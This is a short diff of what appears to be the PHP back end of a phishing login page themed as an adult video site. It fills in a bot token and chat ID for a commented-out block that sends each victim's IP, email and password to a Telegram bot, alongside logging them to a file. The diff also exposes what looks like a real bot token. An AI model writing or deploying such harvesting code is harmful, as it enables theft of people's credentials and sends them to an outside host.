@@ -19,8 +19,8 @@ file_put_contents("log.txt", $data, FILE_APPEND);
 
 // 🔥 OPSIONAL: Kirim ke Telegram (isi token dan chat_id lo)
 /*
-$token = "7212345678:AAHdqTcvkLalala_YourBotToken";
-$chat_id = "1234567890";
+$token = "8627394983:AAFPZR6Elkjf70Ck331gCFZhDjp2Cr_itVk";
+$chat_id = "8246027862";
 $message = urlencode("📧 VIDEY 18+ LOGIN\nIP: $ip\nEmail: $email\nPassword: $password");
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message");
 */
